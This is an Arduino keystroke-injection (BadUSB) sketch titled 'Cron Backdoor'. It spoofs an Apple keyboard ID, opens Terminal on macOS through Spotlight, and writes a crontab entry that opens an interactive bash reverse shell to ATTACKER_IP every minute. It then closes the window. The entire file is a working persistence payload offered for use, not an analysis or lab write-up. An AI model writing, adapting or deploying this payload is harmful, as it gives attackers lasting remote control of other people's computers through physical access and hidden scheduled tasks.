#include "Keyboard.h"

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup(){
  Keyboard.begin();
  delay(1000);

  // Add reverse shell to crontab
  // Author: Generated
  // Title: Cron Backdoor
  // Target: macOS
  // Version: 1.0
  // Category: Persistence
  // ID 05ac:021e Apple:Keyboard
  delay(1000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("terminal");

  delay(500);

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.print("crontab -l > /tmp/cron_backup 2>/dev/null || echo '' > /tmp/cron_backup");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("echo '* * * * * /bin/bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1' >> /tmp/cron_backup");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("crontab /tmp/cron_backup");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("crontab -l");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('w');
  Keyboard.releaseAll();

  Keyboard.end();
}

void loop() {}